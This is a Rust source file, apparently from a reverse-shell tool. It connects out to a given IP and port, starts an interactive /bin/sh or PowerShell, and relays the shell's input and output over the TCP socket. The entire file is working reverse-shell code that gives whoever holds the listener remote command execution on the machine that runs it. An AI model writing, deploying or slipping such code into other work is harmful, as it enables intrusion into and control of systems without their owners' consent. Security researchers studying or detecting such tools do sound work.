use crate::errors::TCPError;
use anyhow::{self, Context};
use std::{net::{IpAddr, SocketAddr}, process::Stdio, str::FromStr};
use tokio::{
	io::{BufReader, BufWriter},
	net::{TcpSocket, TcpStream},
	process::Command,
};

pub async fn run(ip: &str, port: u16) -> anyhow::Result<()> {
	let addr: SocketAddr = SocketAddr::new(IpAddr::from_str(ip).with_context(|| format!("Failed to convert the string: {ip} to an IP address"))?, port);

	let socket: TcpSocket = match TcpSocket::new_v4().context("Failed to create socket") {
		Ok(s) => s,
		Err(e) => {
			eprintln!("Error creating socket: {}", e);
			return Err(TCPError::SocketCreationFailure(e).into());
		}
	};

	let stream: TcpStream = match socket.connect(addr).await.context("Failed to connect to the listener") {
		Ok(s) => s,
		Err(e) => {
			eprintln!("Failed to connect to {}: {}", addr, e);
			return Err(TCPError::ConnectionFailure(addr).into());
		}
	};


	println!("Connected to {}", addr);

	let (reader, writer) = stream.into_split();
	let mut socket_stdin = BufReader::new(reader);
	let mut socket_stdout = BufWriter::new(writer);


	let command: &str = if cfg!(target_os = "windows") {
		"powershell.exe"
	} else {
		"/bin/sh"
	};

	let mut child = Command::new(command)
		.arg("-i")
		.stdin(Stdio::piped())
		.stdout(Stdio::piped())
		.stderr(Stdio::piped())
		.spawn().context("Failed to spawn child process")?;

	let mut stdin = child.stdin.take().expect("Stdin unavailable");
	let mut stdout = child.stdout.take().expect("Stdout unavailable");
	let mut stderr = child.stderr.take().expect("Stderr unavailable");

	tokio::spawn(async move {
		tokio::io::copy(&mut socket_stdin, &mut stdin).await.expect("Failed to copy from socket to stdin");
	});

	tokio::spawn(async move {
		tokio::io::copy(&mut stdout, &mut socket_stdout).await.expect("Failed to copy from stderr to socket");
		tokio::io::copy(&mut stderr, &mut socket_stdout).await.expect("Failed to copy from stderr to socket");
	});

	child.wait().await.context("Child process failed")?;

	Ok(())
}